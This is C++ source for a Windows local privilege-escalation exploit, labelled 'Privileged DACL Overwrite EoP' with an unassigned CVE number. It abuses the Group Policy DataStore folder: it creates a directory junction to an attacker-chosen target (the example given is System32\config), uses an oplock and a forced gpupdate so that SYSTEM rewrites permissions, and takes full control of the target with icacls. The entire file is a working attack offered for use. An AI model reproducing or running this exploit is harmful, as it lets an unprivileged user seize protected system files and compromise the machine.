#include "stdafx.h"
#include "ntimports.h"
#include "winbase.h"
#include <Windows.h>
#include <iostream>
#include <ctime>
#include "CommonUtils.h"
#include "FileOpLock.h"
#include <Sddl.h>

#pragma comment(lib, "advapi32.lib")
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

static FileOpLock* oplock = nullptr;
LPTSTR sidstring;

int getSID()
{
	std::wstring username(_wgetenv(L"USERDOMAIN"));
	username += L"\\";
	username += _wgetenv(L"USERNAME");
	LPCTSTR wszAccName = username.c_str();
	LPTSTR wszDomainName = (LPTSTR)GlobalAlloc(GPTR, sizeof(TCHAR) * 1024);
	DWORD cchDomainName = 1024;
	SID_NAME_USE eSidType;
	char sid_buffer[1024];
	DWORD cbSid = 1024;
	SID* sid = (SID*)sid_buffer;

	if (!LookupAccountName(NULL, wszAccName, sid_buffer, &cbSid, wszDomainName, &cchDomainName, &eSidType)) {
		return GetLastError();
	}

	if (!ConvertSidToStringSid(sid, &sidstring)) {
		return GetLastError();
	}

	//printf("%ws\n", sidstring);
	return 0;

}

BOOL DirectoryExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void HandleOplock()
{
	wchar_t const* localappdata = _wgetenv(L"ProgramData"); //Path to ProgramData "C:\ProgramData"
	wchar_t const* relpath = (L"\\Microsoft\\GroupPolicy\\Users\\"); //First part to the Group Policy "User" folder
	wchar_t const* SID = sidstring; //SID of the current user
	wchar_t const* Datastore = L"\\DataStore\\0\\sysvol\\$AAAA"; //Second part of the Group Policy "User" folder

	std::wstring junctionpath(localappdata);
	junctionpath += std::wstring(relpath);
	junctionpath += std::wstring(SID);
	junctionpath += std::wstring(Datastore);
	RemoveDirectoryW(junctionpath.c_str());
	DebugPrintf("[!] OpLock triggered!\n[!] Press ENTER to close Oplock and trigger vuln!\n");
	getc(stdin);

}

bool SetOpLock() {
	wchar_t const* programdata = _wgetenv(L"ProgramData"); //Path to LocalAppData "C:\Users\<username>\AppData\Local"
	wchar_t const* oplockpath = (L"\\DataStore\\0\\sysvol\\$BBBB\\ohno.txt"); //Location of the bogus file created
	wchar_t const* relpath = (L"\\Microsoft\\GroupPolicy\\Users\\"); //Location of the junction point
	wchar_t const* SID = sidstring; //user SID
	wchar_t const* Datastore = L"\\DataStore\\0\\sysvol\\$AAAA";
	std::wstring junctionpath(programdata);
	junctionpath += std::wstring(relpath);
	junctionpath += std::wstring(SID);
	junctionpath += std::wstring(Datastore);
	std::wstring fullpath(programdata);
	fullpath += std::wstring(relpath);
	fullpath += std::wstring(SID);
	fullpath += std::wstring(oplockpath);
	LPCWSTR target = fullpath.c_str();
	LPCWSTR share_mode = L"";

	printf("[+] Going to set Oplock on %ws!\n", target);
	oplock = FileOpLock::CreateLock(target, share_mode, HandleOplock);
	if (oplock != nullptr)
	{
		printf("\n[!] OpLock set!\n");
		printf("[!] Triggering Oplock!\n");
		if (!system("gpupdate /target:user /force")){
			oplock->WaitForLock(5000);
			if (DirectoryExists(junctionpath.c_str())) {
				printf("[!] Oplock didn't trigger within the expected time .. aborting!\n");
				printf("[!] Chances are the DACL write process was halted due to a file that didn't allow SYSTEM to write DACL!\n");
			}
			else {
				printf("[!] You should have 'full control' permission on folders/files within the target folder\n");
			}

		}
		
		///Cleanup();
		delete oplock;
	}
	else
	{
		printf("Error creating oplock\n");
		return 1;
	}
}


// Generate an unicode string of length 'len' whose characters are in range [start, end]
wchar_t* generateRandomUnicodeString(size_t len, size_t start, size_t end)
{
	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'
	size_t intervalLength = end - start + 1; // +1 for inclusive range

	srand(time(NULL));
	for (auto i = 0; i < len; i++) {
		ustr[i] = (rand() % intervalLength) + start;
	}
	ustr[len] = L'\0';
	return ustr;
}

void gimmeroot(_TCHAR* targetpath) {
	wchar_t const* localappdata = _wgetenv(L"ProgramData"); //Path to ProgramData "C:\ProgramData"
	wchar_t const* relpath = (L"\\Microsoft\\GroupPolicy\\Users\\"); //Location of the group policy datastore
	wchar_t const* SID = sidstring;
	wchar_t const* Datastore = L"\\DataStore";
	wchar_t* file = generateRandomUnicodeString(10, 0x0041, 0x005A); //random foldername
	std::wstring fullpath(localappdata);
	fullpath += std::wstring(relpath);
	fullpath += std::wstring(SID);
	fullpath += std::wstring(Datastore);
	TCHAR* szBuffsrc = (wchar_t*)fullpath.c_str();
	int newdir = 0;

	printf("[+] Checking if folder exists ... \n");
	if (!DirectoryExists(szBuffsrc)) {
		char command[1024];
		wchar_t const* fp = (L"\\0\\sysvol");
		std::wstring fullpath2;
		fullpath2 += std::wstring(fullpath);
		fullpath2 += std::wstring(fp);
		printf("[+] Didn't exist ... going to create it for you!\n");
		printf("[+] Creating %ws!\n",fullpath2.c_str());
		sprintf(command, "mkdir %ws", fullpath2.c_str());
		system(command);
		newdir = 1;
	}

	if (DirectoryExists(szBuffsrc)) {
		char command_move[1024];
		char command_jp[1024];
		char command_cr[1024];
		char command_di[1024];
		char command_fc[1024];
		std::wstring fullpathmove(fullpath);
		fullpathmove += std::wstring(file);
		if (!newdir) {
			printf("[+] Recreating directory structure\n");
			wchar_t const* fp = (L"\\0\\sysvol");
			std::wstring fullpath2;
			fullpath2 += std::wstring(fullpath);
			fullpath2 += std::wstring(fp);
			printf("[+] Disabling inherited ACL and taking 'Full Control'!\n");
			sprintf(command_di, "icacls %ws /inheritance:r /grant:r %%USERDOMAIN%%\\%%USERNAME%%:(OI)(CI)(F)", fullpath2.c_str());
			system(command_di);
		}

		printf("[+] Creating bogus directories...\n");
		std::wstring newfullpath(fullpath);
		newfullpath += std::wstring(file);
		TCHAR* szBuffdst = (wchar_t*)newfullpath.c_str();
		wchar_t const* one = (L"\\0\\sysvol\\$AAAA"); //bogus directory 1
		wchar_t const* two = (L"\\0\\sysvol\\$BBBB"); //bogus directory 2
		std::wstring dir1(fullpath);
		std::wstring dir2(fullpath);
		dir1 += std::wstring(one);
		dir2 += std::wstring(two);
		std::wstring junctionpoint;
		printf("[+] Attempting to create junction point!\n");
		sprintf(command_jp, "mklink /j %ws \"%ws\"", dir1.c_str(), targetpath);
		if (system(command_jp))  //create bogus directory 1
		{
			printf("[+] Directory Junction $AAAA failed!\n");
			//cleanup();
			exit(0);
		}
		if (!CreateDirectory(dir2.c_str(), NULL)) //create bogus directory 2
		{
			printf("[+] Directory Creation $BBBB failed!\n");
			if (DirectoryExists(dir2.c_str())) {
				printf("[+] Directory $BBBB already exists! Moving on...\n");
			}
			else {
				exit(0);
			}
			
		}
		else {
			wchar_t const* file = (L"\\ohno.txt"); //bogus filename
			dir2 += std::wstring(file);
			HANDLE hfile = CreateFile(
				dir2.c_str(),               // Notice the L for a wide char literal 
				GENERIC_READ,
				0,
				NULL,
				CREATE_NEW,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			CloseHandle(hfile);
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{

	if (argc < 2) {
		printf("# Privileged DACL Overwrite EoP\n");
		printf("# CVE: CVE-2020-XXXX \n");
		printf("# Exploit Author: Nabeel Ahmed (@rogue_kdc)\n");
		printf("# Tested on: Microsoft Windows 10 WIP FAST RING Build 19631.1 x64\n");
		printf("# Category: Local\n");
		printf("-------------------------------------------------\n");
		printf("[+] Usage: exploit.exe <path to folder to takeover>\n");
		printf("[+] (E.g., exploit.exe C:\\Windows\\System32\\config\n");
		printf("-------------------------------------------------\n");
	}
	else {
		try {
			if (argc < 3) {
				printf("# Privileged DACL Overwrite EoP\n");
				printf("# CVE: CVE-2020-XXXX \n");
				printf("# Exploit Author: Nabeel Ahmed (@rogue_kdc)\n");
				printf("# Tested on: Microsoft Windows 10 WIP FAST RING Build 19631.1 x64\n");
				printf("# Category: Local\n");
				printf("-------------------------------------------------\n");
				printf("\n");
				printf("\n");
				getSID();
				gimmeroot(argv[1]);
				SetOpLock();
			}

		}
		catch (...) {

		}
	}


	exit(0);
}





